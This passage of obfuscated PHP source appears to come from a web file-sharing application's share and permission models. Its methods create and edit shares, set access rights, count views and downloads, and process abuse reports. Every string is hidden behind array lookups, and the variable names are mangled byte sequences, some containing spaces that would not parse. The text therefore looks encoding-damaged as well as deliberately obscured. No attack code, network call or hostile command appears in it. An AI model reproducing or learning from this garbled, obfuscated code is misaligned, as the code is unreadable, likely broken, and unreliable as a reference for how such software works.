$µ›ÔÕÕ·[1666] => array($µ›ÔÕÕ·[1026], $µ›ÔÕÕ·[204])); $“ÚéÍÒÛ = $this->field($†È‚í§Ö)->where($€€ˆÆåå)->select(); foreach ($“ÚéÍÒÛ as $Õ×÷ëÌ => &$¸”ıåàÛ) { $¸”ıåàÛ[$µ›ÔÕÕ·[1974]] = $ã„ô²¤Ô[$¸”ıåàÛ[$µ›ÔÕÕ·[493]]]; } unset($¸”ıåàÛ); $Ò’¶‘–¸ = array($µ›ÔÕÕ·[1979] => $“ÚéÍÒÛ, $µ›ÔÕÕ·[1980] => $íÄâ²¯[$µ›ÔÕÕ·[374]]); return $Ò’¶‘–¸; } protected function shareAdd($œğ«½«æ, $ Ğí€º¯) { $å€ŠĞ =& $_SERVER[¯µç›È¢]; $¤éİğ = $this->_addShareData($œğ«½«æ, $ Ğí€º¯); if (!empty($ Ğí€º¯[$å€ŠĞ[1981]])) { $this->_shareAuthSet($¤éİğ, $ Ğí€º¯[$å€ŠĞ[1981]]); } $this->shareEventAdd($œğ«½«æ, $ Ğí€º¯, $å€ŠĞ[1174]); return $¤éİğ; } protected function shareAddSystem($µïØºî, $ÛÒÎÕ‘Â) { $ª€ï¬¥è =& $_SERVER[¯µç›È¢]; $éŞõ¹¢„ = $this->_addShareData($µïØºî, $ÛÒÎÕ‘Â, $ª€ï¬¥è[1286]); $this->_shareAuthSet($éŞõ¹¢„, $ÛÒÎÕ‘Â[$ª€ï¬¥è[1981]]); return $éŞõ¹¢„; } private function shareEventAdd($âÚôÈÎ•, $¸âÆ§·», $ÁŸ¸Ï‡ƒ = "\x61\x64\144") { $Í¬í”ıç =& $_SERVER[¯µç›È¢]; if (!$âÚôÈÎ• || $âÚôÈÎ• == $Í¬í”ıç[204]) { return; } if ($ÁŸ¸Ï‡ƒ == $Í¬í”ıç[1174]) { if ($¸âÆ§·»[$Í¬í”ıç[498]] == $Í¬í”ıç[99]) { Model($Í¬í”ıç[572])->eventShare($âÚôÈÎ•, $Í¬í”ıç[1982]); } if ($¸âÆ§·»[$Í¬í”ıç[500]] == $Í¬í”ıç[99]) { Model($Í¬í”ıç[572])->eventShare($âÚôÈÎ•, $Í¬í”ıç[1983]); } return; } $¿ÃĞıø = $this->getInfoByPath($âÚôÈÎ•); $Ä³Ş¹ŠÃ = $Í¬í”ıç[1984]; if ($¿ÃĞıø[$Í¬í”ıç[498]] == $Í¬í”ıç[204] && $¸âÆ§·»[$Í¬í”ıç[498]] == $Í¬í”ıç[99]) { $Ä³Ş¹ŠÃ = $Í¬í”ıç[1982]; } if ($¿ÃĞıø[$Í¬í”ıç[498]] == $Í¬í”ıç[99] && $¸âÆ§·»[$Í¬í”ıç[498]] == $Í¬í”ıç[204]) { $Ä³Ş¹ŠÃ = $Í¬í”ıç[1985]; } if ($¿ÃĞıø[$Í¬í”ıç[500]] == $Í¬í”ıç[204] && $¸âÆ§·»[$Í¬í”ıç[500]] == $Í¬í”ıç[99]) { $Ä³Ş¹ŠÃ = $Í¬í”ıç[1983]; } if ($¿ÃĞıø[$Í¬í”ıç[500]] == $Í¬í”ıç[99] && $¸âÆ§·»[$Í¬í”ıç[500]] == $Í¬í”ıç[204]) { $Ä³Ş¹ŠÃ = $Í¬í”ıç[1986]; } Model($Í¬í”ıç[572])->eventShare($âÚôÈÎ•, $Ä³Ş¹ŠÃ); return; } private function _addShareData($Œ”œ†Ö£, $–¢úÁÕ = array(), $­Î¥ôÓ§ = false) { $ñÖ¿íã =& $_SERVER[¯µç›È¢]; $Ê†ÅÏõ´ = $­Î¥ôÓ§ == $ñÖ¿íã[1286] ? 0 : USER_ID; $ñš‰Ò·ñ = array($ñÖ¿íã[423] => $Œ”œ†Ö£, $ñÖ¿íã[1657] => $Ê†ÅÏõ´); if ($Œ”œ†Ö£ == 0) { $ñš‰Ò·ñ = array($ñÖ¿íã[1987] => $–¢úÁÕ[$ñÖ¿íã[1186]], $ñÖ¿íã[1657] => $Ê†ÅÏõ´); } if ($Ñ’²»‰ = $this->where($ñš‰Ò·ñ)->find()) { return $Ñ’²»‰[$ñÖ¿íã[493]]; } if ($Œ”œ†Ö£ == 0) { $ÕÖÍÑê® = array($ñÖ¿íã[32] => get_path_this($–¢úÁÕ[$ñÖ¿íã[88]])); } else { $ÕÖÍÑê® = Model($ñÖ¿íã[842])->sourceInfo($Œ”œ†Ö£); if (!$ÕÖÍÑê®) { return !1; } } if (!$–¢úÁÕ[$ñÖ¿íã[1566]]) { $–¢úÁÕ[$ñÖ¿íã[1566]] = $ÕÖÍÑê®[$ñÖ¿íã[32]]; } $òÒÖ¬»î = array($ñÖ¿íã[1657] => $Ê†ÅÏõ´, $ñÖ¿íã[423] => $Œ”œ†Ö£, $ñÖ¿íã[1566] => $ñÖ¿íã[12], $ñÖ¿íã[498] => 0, $ñÖ¿íã[500] => 0, $ñÖ¿íã[1186] => $ñÖ¿íã[12], $ñÖ¿íã[315] => $ñÖ¿íã[12], $ñÖ¿íã[901] => $ñÖ¿íã[12], $ñÖ¿íã[1988] => 0, $ñÖ¿íã[1989] => 0, $ñÖ¿íã[501] => 0, $ñÖ¿íã[502] => $ñÖ¿íã[12], $ñÖ¿íã[495] => $ñÖ¿íã[12]); $ô¾èÔ² = explode($ñÖ¿íã[50], $ñÖ¿íã[1990]); foreach ($ô¾èÔ² as $°Ñ¶®ò‘) { if (!isset($–¢úÁÕ[$°Ñ¶®ò‘])) { continue; } $òÒÖ¬»î[$°Ñ¶®ò‘] = $–¢úÁÕ[$°Ñ¶®ò‘]; } $»¶§Ÿ ˆ = $this->add($òÒÖ¬»î); $¡¬ü³ƒ¬ = array($ñÖ¿íã[495] => short_id($»¶§Ÿ ˆ)); $this->where(array($ñÖ¿íã[492] => $»¶§Ÿ ˆ))->save($¡¬ü³ƒ¬); return $»¶§Ÿ ˆ; } private function _shareAuthSet($À½õÁâê, $¤ûåü¬¦) { $“—µğû =& $_SERVER[¯µç›È¢]; if (!is_array($¤ûåü¬¦)) { return !1; } $¡„‰ËšÏ = Model($“—µğû[1941]); $¡„‰ËšÏ->where(array($“—µğû[493] => $À½õÁâê))->delete(); $¢ÚœñóŠ = array(); foreach ($¤ûåü¬¦ as $ÑÀíƒ÷Ù) { $ìëŞ²ùÓ = SourceModel::TYPE_USER; if ($ÑÀíƒ÷Ù[$“—µğû[417]] == SourceModel::TYPE_GROUP) { $ìëŞ²ùÓ = SourceModel::TYPE_GROUP; } $²Œçı¯À = array($“—µğû[493] => $À½õÁâê, $“—µğû[417] => $ìëŞ²ùÓ, $“—µğû[510] => intval($ÑÀíƒ÷Ù[$“—µğû[510]]), $“—µğû[1937] => 0, $“—µğû[1991] => -1); if ($ÑÀíƒ÷Ù[$“—µğû[1937]]) { $²Œçı¯À[$“—µğû[1937]] = $ÑÀíƒ÷Ù[$“—µğû[1937]]; } else { if ($ÑÀíƒ÷Ù[$“—µğû[1991]]) { $²Œçı¯À[$“—µğû[1991]] = $ÑÀíƒ÷Ù[$“—µğû[1991]]; } } $¢ÚœñóŠ[] = $²Œçı¯À; } return $¡„‰ËšÏ->addAll($¢ÚœñóŠ, array(), !0); } public function numViewAdd($­·İÄèò) { $ûÊ‰´˜× =& $_SERVER[¯µç›È¢]; $Ş„ë÷Ò‚ = array($ûÊ‰´˜×[492] => $­·İÄèò); $this->where($Ş„ë÷Ò‚)->setAdd($ûÊ‰´˜×[1988]); } public function numDownloadAdd($‡¬òÇøí) { $ß«œÂôñ =& $_SERVER[¯µç›È¢]; $Í»¥”Ïà = array($ß«œÂôñ[492] => $‡¬òÇøí); $this->where($Í»¥”Ïà)->setAdd($ß«œÂôñ[1989]); } protected function shareEdit($‹öêœâ”, $Œ¼ñìÚ…) { $Ëáâ‚ÓÙ =& $_SERVER[¯µç›È¢]; $¬ÉØøÔ— = $this->getInfo($‹öêœâ”); if (!$¬ÉØøÔ—) { return !1; } $this->_checkLinkShare($Œ¼ñìÚ…, $¬ÉØøÔ—); $¬’“¸Í“ = array(); $¸ùñšÃ = explode($Ëáâ‚ÓÙ[50], $Ëáâ‚ÓÙ[1992]); foreach ($¸ùñšÃ as $ş®äÑ„¾) { if (!array_key_exists($ş®äÑ„¾, $Œ¼ñìÚ…)) { continue; } $¬’“¸Í“[$ş®äÑ„¾] = $Œ¼ñìÚ…[$ş®äÑ„¾]; } $this->shareEventAdd($¬ÉØøÔ—[$Ëáâ‚ÓÙ[408]], $Œ¼ñìÚ…, $Ëáâ‚ÓÙ[1804]); $this->where(array($Ëáâ‚ÓÙ[492] => $‹öêœâ”))->save($¬’“¸Í“); if (isset($Œ¼ñìÚ…[$Ëáâ‚ÓÙ[1981]])) { $this->_shareAuthSet($‹öêœâ”, $Œ¼ñìÚ…[$Ëáâ‚ÓÙ[1981]]); } return !0; } private function _checkLinkShare($à«³µíÀ, $½³“Ä) { $¼Â­ÒÎ† =& $_SERVER[¯µç›È¢]; if ($à«³µíÀ[$¼Â­ÒÎ†[498]] != $¼Â­ÒÎ†[99]) { return; } $ç½¿²™˜ = $½³“Ä[$¼Â­ÒÎ†[97]][$¼Â­ÒÎ†[408]]; if ($½³“Ä[$¼Â­ÒÎ†[97]][$¼Â­ÒÎ†[33]] != $¼Â­ÒÎ†[206]) { $”Â¬ØÑá = $this->_folderReport($ç½¿²™˜); if (!$”Â¬ØÑá) { return; } show_json(LNG($¼Â­ÒÎ†[1993]) . $¼Â­ÒÎ†[1994] . $”Â¬ØÑá, !1); } $òÓ¯µ· = Model($¼Â­ÒÎ†[842])->fileInfoGet($½³“Ä[$¼Â­ÒÎ†[97]][$¼Â­ÒÎ†[408]]); if (!$òÓ¯µ·) { return; } $‘±ş¸‡ = $this->shareFileMeta($òÓ¯µ·[$¼Â­ÒÎ†[472]]); if (isset($‘±ş¸‡[$¼Â­ÒÎ†[382]]) && $‘±ş¸‡[$¼Â­ÒÎ†[382]] == $¼Â­ÒÎ†[99]) { show_json(LNG($¼Â­ÒÎ†[1995]), !1); } } private function _folderReport($á„üÂşó) { $ü¦íÎŒĞ =& $_SERVER[¯µç›È¢]; $À¸Ûºü = array($ü¦íÎŒĞ[472] => array($ü¦íÎŒĞ[1024], 0), $ü¦íÎŒĞ[767] => 3); $¡ğ¼¥şĞ = Model($ü¦íÎŒĞ[1996])->where($À¸Ûºü)->field($ü¦íÎŒĞ[472])->select(); if (!$¡ğ¼¥şĞ) { return !1; } $¡ğ¼¥şĞ = array_to_keyvalue($¡ğ¼¥şĞ, $ü¦íÎŒĞ[12], $ü¦íÎŒĞ[472]); $áÎÜ‚ï… = $ü¦íÎŒĞ[50] . $á„üÂşó . $ü¦íÎŒĞ[50]; $À¸Ûºü = array($ü¦íÎŒĞ[472] => array($ü¦íÎŒĞ[7], $¡ğ¼¥şĞ), $ü¦íÎŒĞ[526] => array($ü¦íÎŒĞ[391], "\45{$áÎÜ‚ï…}\45"), $ü¦íÎŒĞ[436] => 0); $èÀªï“æ = Model($ü¦íÎŒĞ[842])->where($À¸Ûºü)->field($ü¦íÎŒĞ[1997])->find(); if (!$èÀªï“æ) { return !1; } $“öòõç = substr($èÀªï“æ[$ü¦íÎŒĞ[526]], strpos($èÀªï“æ[$ü¦íÎŒĞ[526]], $áÎÜ‚ï…)); $À¸Ûºü = array($ü¦íÎŒĞ[408] => array($ü¦íÎŒĞ[7], trim($“öòõç, $ü¦íÎŒĞ[50]))); $º»„Âº˜ = Model($ü¦íÎŒĞ[842])->where($À¸Ûºü)->field($ü¦íÎŒĞ[32])->select(); $¿ó†Ó¨ö = array_to_keyvalue($º»„Âº˜, $ü¦íÎŒĞ[12], $ü¦íÎŒĞ[32]); $¿ó†Ó¨ö[] = $èÀªï“æ[$ü¦íÎŒĞ[32]]; return implode($ü¦íÎŒĞ[8], $¿ó†Ó¨ö); } protected function remove($ŞÊŒ”€È) { $®¹ìÈ·Ì =& $_SERVER[¯µç›È¢]; if (is_array($ŞÊŒ”€È)) { $ŞÊŒ”€È = array($®¹ìÈ·Ì[7], $ŞÊŒ”€È); } $Èğ‘¤ùÌ = array($®¹ìÈ·Ì[493] => $ŞÊŒ”€È); $‘²Š«÷ = $this->where($Èğ‘¤ùÌ)->delete(); if ($‘²Š«÷) { Model($®¹ìÈ·Ì[604])->where(array($®¹ìÈ·Ì[493] => $ŞÊŒ”€È))->delete(); } $‘ÎñÓüî = is_array($ŞÊŒ”€È) ? $ŞÊŒ”€È[1] : array($ŞÊŒ”€È); for ($ ©ŸÈ× = 0; $ ©ŸÈ× < count($‘ÎñÓüî); $ ©ŸÈ×++) { $µİÅŒø = $this->getInfo($‘ÎñÓüî[$ ©ŸÈ×]); if ($µİÅŒø[$®¹ìÈ·Ì[500]] == $®¹ìÈ·Ì[99]) { Model($®¹ìÈ·Ì[572])->eventShare($µİÅŒø[$®¹ìÈ·Ì[408]], $®¹ìÈ·Ì[1986]); } if ($µİÅŒø[$®¹ìÈ·Ì[498]] == $®¹ìÈ·Ì[99]) { Model($®¹ìÈ·Ì[572])->eventShare($µİÅŒø[$®¹ìÈ·Ì[408]], $®¹ìÈ·Ì[1985]); } } return $‘²Š«÷; } protected function removeBySource($¥¹µ¿¹Ã) { $œ—™´Ğµ =& $_SERVER[¯µç›È¢]; $´ÍË·Ä¦ = array($œ—™´Ğµ[423] => array($œ—™´Ğµ[424], $¥¹µ¿¹Ã)); $§èŞà©ä = $this->field($œ—™´Ğµ[493])->where($´ÍË·Ä¦)->select(); $§èŞà©ä = array_to_keyvalue($§èŞà©ä, $œ—™´Ğµ[12], $œ—™´Ğµ[493]); if (!$§èŞà©ä) { return; } $´ÍË·Ä¦ = array($œ—™´Ğµ[492] => array($œ—™´Ğµ[424], $§èŞà©ä)); $this->where($´ÍË·Ä¦)->delete(); Model($œ—™´Ğµ[604])->where($´ÍË·Ä¦)->delete(); } public function listAll($£»È«•Ã) { $ñ¼ªëÊ =& $_SERVER[¯µç›È¢]; $çŒË„õş = array(); if ($£»È«•Ã[$ñ¼ªëÊ[1666]]) { $çŒË„õş[$ñ¼ªëÊ[1666]] = $£»È«•Ã[$ñ¼ªëÊ[1666]]; } if ($£»È«•Ã[$ñ¼ªëÊ[778]]) { $ã›¦ıã¯ = $£»È«•Ã[$ñ¼ªëÊ[501]] ? $£»È«•Ã[$ñ¼ªëÊ[501]] : strtotime(date($ñ¼ªëÊ[1998])); $çŒË„õş[$ñ¼ªëÊ[207]] = array($ñ¼ªëÊ[341], array($£»È«•Ã[$ñ¼ªëÊ[778]], $ã›¦ıã¯)); } if ($£»È«•Ã[$ñ¼ªëÊ[33]]) { $çŒË„õş[$£»È«•Ã[$ñ¼ªëÊ[33]]] = 1; } else { $çŒË„õş[] = array($ñ¼ªëÊ[498] => array($ñ¼ªëÊ[1024], 0), $ñ¼ªëÊ[500] => array($ñ¼ªëÊ[1024], 0), $ñ¼ªëÊ[1975] => $ñ¼ªëÊ[1931]); } if ($£»È«•Ã[$ñ¼ªëÊ[1927]]) { $çŒË„õş[] = array($ñ¼ªëÊ[495] => $£»È«•Ã[$ñ¼ªëÊ[1927]], $ñ¼ªëÊ[1566] => array($ñ¼ªëÊ[391], "\x25{$£»È«•Ã[$ñ¼ªëÊ[1927]]}\45"), $ñ¼ªëÊ[1975] => $ñ¼ªëÊ[1931]); } $»‹á°Âë = $this->_makeOrder()->where($çŒË„õş)->selectPage(20); if (empty($»‹á°Âë[$ñ¼ªëÊ[377]])) { return array(); } $this->_listDataApply($»‹á°Âë[$ñ¼ªëÊ[377]]); return $»‹á°Âë; } public function listDataApply($¿„‡•¦) { $this->_listDataApply($¿„‡•¦); return $¿„‡•¦; } private function _listDataApply(&$İØõÍ¾‚) { $ë°ş‘—Ã =& $_SERVER[¯µç›È¢]; $ãçê¢şÍ = array_to_keyvalue($İØõÍ¾‚, $ë°ş‘—Ã[12], $ë°ş‘—Ã[1666]); $ë•ë‚¶ö = Model($ë°ş‘—Ã[546])->userListInfo(array_unique($ãçê¢şÍ)); $ÉĞè§ò = array_to_keyvalue($İØõÍ¾‚, $ë°ş‘—Ã[12], $ë°ş‘—Ã[408]); $Êˆ‹÷Ÿ = Model($ë°ş‘—Ã[842])->sourceListInfo($ÉĞè§ò, !0); foreach ($İØõÍ¾‚ as $£¸‰ş‰¦ => &$Óñ»ŸÍ) { $©ÂÙ€Â© = $Óñ»ŸÍ[$ë°ş‘—Ã[1666]]; $Óñ»ŸÍ[$ë°ş‘—Ã[1999]] = $ë•ë‚¶ö[$©ÂÙ€Â©] ? $ë•ë‚¶ö[$©ÂÙ€Â©] : !1; $ëÄ“¥” = $Óñ»ŸÍ[$ë°ş‘—Ã[408]]; $Óñ»ŸÍ[$ë°ş‘—Ã[97]] = $Êˆ‹÷Ÿ[$ëÄ“¥”] ? $Êˆ‹÷Ÿ[$ëÄ“¥”] : !1; if ($Óñ»ŸÍ[$ë°ş‘—Ã[97]][$ë°ş‘—Ã[436]] == $ë°ş‘—Ã[99]) { unset($İØõÍ¾‚[$£¸‰ş‰¦]); } if ($Óñ»ŸÍ[$ë°ş‘—Ã[97]] != $ë°ş‘—Ã[204] && !$Óñ»ŸÍ[$ë°ş‘—Ã[97]]) { unset($İØõÍ¾‚[$£¸‰ş‰¦]); } } unset($Óñ»ŸÍ); $İØõÍ¾‚ = array_values($İØõÍ¾‚); } private function _makeOrder($‘ÛÎ…†î = '') { $µûÄù ‚ =& $_SERVER[¯µç›È¢]; $Öí×çãÛ = array($µûÄù ‚[207], $µûÄù ‚[501], $µûÄù ‚[1988], $µûÄù ‚[1989]); $ëö´È = array($µûÄù ‚[453] => $µûÄù ‚[454], $µûÄù ‚[455] => $µûÄù ‚[456]); $Öğƒ’ÆÈ = Input::get($µûÄù ‚[460], $µûÄù ‚[7], $µûÄù ‚[429], $Öí×çãÛ); $ò€óö£Ò = Input::get($µûÄù ‚[461], $µûÄù ‚[7], $µûÄù ‚[2000], array($µûÄù ‚[1924], $µûÄù ‚[455])); $ò€óö£Ò = $ëö´È[$ò€óö£Ò]; $‘ÛÎ…†î = $‘ÛÎ…†î . "{$Öğƒ’ÆÈ}\x20{$ò€óö£Ò}"; return $this->order($‘ÛÎ…†î); } public function reportAdd($ Ã¹†Ğ) { $–ÛˆØ =& $_SERVER[¯µç›È¢]; $ç«™ĞòŒ = array($–ÛˆØ[493] => $ Ã¹†Ğ[$–ÛˆØ[493]], $–ÛˆØ[1666] => USER_ID); if (Model($–ÛˆØ[1996])->where($ç«™ĞòŒ)->find()) { return !1; } $Ã¦âåÍ¶ = array($–ÛˆØ[493] => $ Ã¹†Ğ[$–ÛˆØ[493]], $–ÛˆØ[1566] => $ Ã¹†Ğ[$–ÛˆØ[1566]], $–ÛˆØ[408] => $ Ã¹†Ğ[$–ÛˆØ[408]], $–ÛˆØ[472] => $ Ã¹†Ğ[$–ÛˆØ[472]], $–ÛˆØ[1666] => USER_ID, $–ÛˆØ[33] => $ Ã¹†Ğ[$–ÛˆØ[33]], $–ÛˆØ[456] => $ Ã¹†Ğ[$–ÛˆØ[456]]); return Model($–ÛˆØ[1996])->add($Ã¦âåÍ¶); } public function reportList($¢Óú’Ï´) { $®«šµˆò =& $_SERVER[¯µç›È¢]; $¯ƒÀËà‰ = array(); if ($¢Óú’Ï´[$®«šµˆò[778]]) { $ã¥åäÕ = $¢Óú’Ï´[$®«šµˆò[501]] ? $¢Óú’Ï´[$®«šµˆò[501]] : strtotime(date($®«šµˆò[1998])); $¯ƒÀËà‰[$®«šµˆò[207]] = array($®«šµˆò[341], array($¢Óú’Ï´[$®«šµˆò[778]], $ã¥åäÕ)); } if (isset($¢Óú’Ï´[$®«šµˆò[33]]) && in_array($¢Óú’Ï´[$®«šµˆò[33]], array($®«šµˆò[99], $®«šµˆò[440], $®«šµˆò[2001], $®«šµˆò[2002], $®«šµˆò[2003]))) { $¯ƒÀËà‰[$®«šµˆò[33]] = $¢Óú’Ï´[$®«šµˆò[33]]; } if (isset($¢Óú’Ï´[$®«šµˆò[767]]) && in_array($¢Óú’Ï´[$®«šµˆò[767]], array($®«šµˆò[204], $®«šµˆò[99], $®«šµˆò[440], $®«šµˆò[2001]))) { $¯ƒÀËà‰[$®«šµˆò[767]] = $¢Óú’Ï´[$®«šµˆò[767]]; } $˜”Æêñ’ = Input::get($®«šµˆò[461], $®«šµˆò[7], $®«šµˆò[2000], array($®«šµˆò[1924], $®«šµˆò[455])); $Û›¼°Åæ = array($®«šµˆò[453] => $®«šµˆò[454], $®«šµˆò[455] => $®«šµˆò[456]); $Šñüé¾¼ = $®«šµˆò[2004] . $Û›¼°Åæ[$˜”Æêñ’]; $ø“ÓÁ¡• = Model($®«šµˆò[1996])->where($¯ƒÀËà‰)->order($Šñüé¾¼)->selectPage(20); if (empty($ø“ÓÁ¡•[$®«šµˆò[377]])) { return array(); } $Òµ—²¥’ = array_to_keyvalue_group($ø“ÓÁ¡•[$®«šµˆò[377]], $®«šµˆò[767], $®«šµˆò[493]); if (!empty($Òµ—²¥’[0])) { $¢Óú’Ï´ = $Òµ—²¥’[0]; $¯ƒÀËà‰ = array($®«šµˆò[493] => array($®«šµˆò[7], $¢Óú’Ï´)); $†ÍÕ›ãÍ = $this->where($¯ƒÀËà‰)->field($®«šµˆò[493])->select(); $†ÍÕ›ãÍ = array_to_keyvalue($†ÍÕ›ãÍ, $®«šµˆò[12], $®«šµˆò[493]); $¦ŠïÈÂ” = array_diff($¢Óú’Ï´, $†ÍÕ›ãÍ); if (!empty($¦ŠïÈÂ”)) { foreach ($ø“ÓÁ¡•[$®«šµˆò[377]] as $šÅüØû => $«®¨ªº) { if (in_array($«®¨ªº[$®«šµˆò[493]], $¦ŠïÈÂ”)) { unset($ø“ÓÁ¡•[$®«šµˆò[377]][$šÅüØû]); } } } } $this->_listDataApply($ø“ÓÁ¡•[$®«šµˆò[377]]); return $ø“ÓÁ¡•; } public function reportStatus($ÀÖ§ «š) { $›ÚÕÃŠı =& $_SERVER[¯µç›È¢]; $Ó•¶„›‰ = array($›ÚÕÃŠı[405] => $ÀÖ§ «š[$›ÚÕÃŠı[405]]); $êË³ÌŞ© = Model($›ÚÕÃŠı[1996])->where($Ó•¶„›‰)->field($›ÚÕÃŠı[2005])->find(); if (!$êË³ÌŞ©) { return !1; } $šÉ©øÏ× = array($›ÚÕÃŠı[767] => $ÀÖ§ «š[$›ÚÕÃŠı[767]]); if ($ÀÖ§ «š[$›ÚÕÃŠı[767]] == $›ÚÕÃŠı[2001] && $êË³ÌŞ©[$›ÚÕÃŠı[767]] == $›ÚÕÃŠı[2001]) { $šÉ©øÏ×[$›ÚÕÃŠı[767]] = 0; } $ö¶«¸ÒÍ = Model($›ÚÕÃŠı[1996])->where($Ó•¶„›‰)->save($šÉ©øÏ×); if ($ÀÖ§ «š[$›ÚÕÃŠı[767]] == $›ÚÕÃŠı[440]) { if ($êË³ÌŞ©[$›ÚÕÃŠı[472]] != $›ÚÕÃŠı[204] && $this->shareFileMeta($êË³ÌŞ©[$›ÚÕÃŠı[472]])) { $this->shareFileMeta($êË³ÌŞ©[$›ÚÕÃŠı[472]], 0); } $this->remove($êË³ÌŞ©[$›ÚÕÃŠı[493]]); return !0; } if ($ö¶«¸ÒÍ && $ÀÖ§ «š[$›ÚÕÃŠı[767]] == $›ÚÕÃŠı[2001]) { $Ê±öØË = $šÉ©øÏ×[$›ÚÕÃŠı[767]] == $›ÚÕÃŠı[2001] ? 1 : 0; $this->shareFileMeta($êË³ÌŞ©[$›ÚÕÃŠı[472]], $Ê±öØË); $this->removeByFile($êË³ÌŞ©[$›ÚÕÃŠı[472]]); } return $ö¶«¸ÒÍ; } private function removeByFile($ï«Ë¶øí) { $ÒÔÊèÜ¼ =& $_SERVER[¯µç›È¢]; $Ùı®ıØæ = Model($ÒÔÊèÜ¼[842])->where(array($ÒÔÊèÜ¼[472] => $ï«Ë¶øí))->field($ÒÔÊèÜ¼[408])->select(); $öÃÒâ°ê = array_to_keyvalue($Ùı®ıØæ, $ÒÔÊèÜ¼[12], $ÒÔÊèÜ¼[408]); $™ºş×ß = array($ÒÔÊèÜ¼[408] => array($ÒÔÊèÜ¼[7], $öÃÒâ°ê), $ÒÔÊèÜ¼[498] => 1); $Ùı®ıØæ = $this->where($™ºş×ß)->field($ÒÔÊèÜ¼[493])->select(); if (empty($Ùı®ıØæ)) { return; } $õÀ§ÏÙº = array_to_keyvalue($Ùı®ıØæ, $ÒÔÊèÜ¼[12], $ÒÔÊèÜ¼[493]); $this->remove($õÀ§ÏÙº); } private function shareFileMeta($»¥Âø¶É, $šÍ§öú¯ = null) { $íËö­íö =& $_SERVER[¯µç›È¢]; $Êà”àŸ = array($íËö­íö[472] => $»¥Âø¶É, $íËö­íö[105] => $íËö­íö[2006]); if (is_null($šÍ§öú¯)) { return Model($íËö­íö[2007])->where($Êà”àŸ)->find(); } $Êà”àŸ[$íËö­íö[382]] = $šÍ§öú¯; Model($íËö­íö[2007])->add($Êà”àŸ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\162\x63\145\137\141\x75\x74\150"; public function getAuth($Š²—à¤â) { $‘àÍºÑ¦ =& $_SERVER[¯µç›È¢]; $öàÇˆö‡ = $this->sourceAuthSelect($Š²—à¤â); $óú¦Ğ­ = array(); $øÀ¿ôøŞ = array(); $ß²§Ò¡ = 2 << 25; foreach ($öàÇˆö‡ as $¶Ñ¢ ) { $Ü¤ôü‰ı = Model($‘àÍºÑ¦[512])->listData($¶Ñ¢ [$‘àÍºÑ¦[1937]]); if (!$Ü¤ôü‰ı) { continue; } $óú¦Ğ­[] = $¶Ñ¢ ; $»ä‚ƒª… = 0; if ($¶Ñ¢ [$‘àÍºÑ¦[417]] == SourceModel::TYPE_GROUP) { $»ä‚ƒª… = $ß²§Ò¡ * 2; } if ($¶Ñ¢ [$‘àÍºÑ¦[417]] == SourceModel::TYPE_USER) { $»ä‚ƒª… = $ß²§Ò¡; } if ($¶Ñ¢ [$‘àÍºÑ¦[417]] == SourceModel::TYPE_USER && $¶Ñ¢ [$‘àÍºÑ¦[510]] == $‘àÍºÑ¦[204]) { $»ä‚ƒª… = 0; } $øÀ¿ôøŞ[] = $Ü¤ôü‰ı[$‘àÍºÑ¦[419]] + $»ä‚ƒª…; } array_multisort($øÀ¿ôøŞ, SORT_DESC, $óú¦Ğ­); return $óú¦Ğ­; } public function sourceAuthSelect($Œù¸‘™­) { $ÌöÀÀ— =& $_SERVER[¯µç›È¢]; static $“úÇåñ¸ = array(); $ÍÈîÊ’– = is_array($Œù¸‘™­) ? !1 : !0; if ($ÍÈîÊ’–) { $Œù¸‘™­ = array($Œù¸‘™­); } $Æß¢ıÔ¤ = array(); foreach ($Œù¸‘™­ as $¹Öšú¹œ) { if (isset($“úÇåñ¸[$¹Öšú¹œ])) { $Æß¢ıÔ¤[$¹Öšú¹œ] = $“úÇåñ¸[$¹Öšú¹œ]; } } if (count($Æß¢ıÔ¤) == count($Œù¸‘™­)) { return $ÍÈîÊ’– ? $Æß¢ıÔ¤[$Œù¸‘™­[0]] : $Æß¢ıÔ¤; } $èÆ­•€ = $ÌöÀÀ—[2008]; $òø’‡å¨ = array($ÌöÀÀ—[408] => array($ÌöÀÀ—[7], $Œù¸‘™­)); $‹Ğ“§ÑÑ = $this->field($èÆ­•€)->order($ÌöÀÀ—[405])->where($òø’‡å¨)->select(); $Ï¸‘ÆÙã = array_to_keyvalue_group($‹Ğ“§ÑÑ, $ÌöÀÀ—[408]); foreach ($Œù¸‘™­ as $¹Öšú¹œ) { $“úÇåñ¸[$¹Öšú¹œ] = $Ï¸‘ÆÙã[$¹Öšú¹œ] ? $Ï¸‘ÆÙã[$¹Öšú¹œ] : array(); } if ($ÍÈîÊ’–) { return $‹Ğ“§ÑÑ; } return $Ï¸‘ÆÙã; } public function setAuth($ï ı–©Ò, $²Ì«‹šó) { $„¨–²ŠÇ =& $_SERVER[¯µç›È¢]; $¢‡Í‰§ = Model($„¨–²ŠÇ[1337])->sourceInfo($ï ı–©Ò); if (!$¢‡Í‰§) { return !1; } if ($¢‡Í‰§[$„¨–²ŠÇ[417]] != SourceModel::TYPE_GROUP) { return !1; } $Á¤ŒÀêÕ = 1; $ØäãÎ¹ = $¢‡Í‰§[$„¨–²ŠÇ[510]]; if ($ØäãÎ¹ != $Á¤ŒÀêÕ) { $âñäÆÓÊ = array($„¨–²ŠÇ[1834] => $ØäãÎ¹); $ïçŒ›­ = Model($„¨–²ŠÇ[1923])->field($„¨–²ŠÇ[1666])->where($âñäÆÓÊ)->select(); $ïçŒ›­ = array_to_keyvalue($ïçŒ›­, $„¨–²ŠÇ[12], $„¨–²ŠÇ[1666]); } $Ü›¶™¦½ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Ô­ÆŠñ = array(); foreach ($²Ì«‹šó as $ãÖ„å½) { if (!in_array($ãÖ„å½[$„¨–²ŠÇ[417]], $Ü›¶™¦½)) { show_json(LNG($„¨–²ŠÇ[2009]), !1); } if ($ØäãÎ¹ != $Á¤ŒÀêÕ) { if ($ãÖ„å½[$„¨–²ŠÇ[417]] == SourceModel::TYPE_GROUP) { } if ($ãÖ„å½[$„¨–²ŠÇ[510]] != 0 && !in_array($ãÖ„å½[$„¨–²ŠÇ[510]], $ïçŒ›­)) { } } if ($ãÖ„å½[$„¨–²ŠÇ[510]] == 0) { $ãÖ„å½[$„¨–²ŠÇ[417]] = SourceModel::TYPE_USER; } $Ô­ÆŠñ[] = array($„¨–²ŠÇ[408] => $ï ı–©Ò, $„¨–²ŠÇ[417] => intval($ãÖ„å½[$„¨–²ŠÇ[417]]), $„¨–²ŠÇ[510] => intval($ãÖ„å½[$„¨–²ŠÇ[510]]), $„¨–²ŠÇ[1937] => 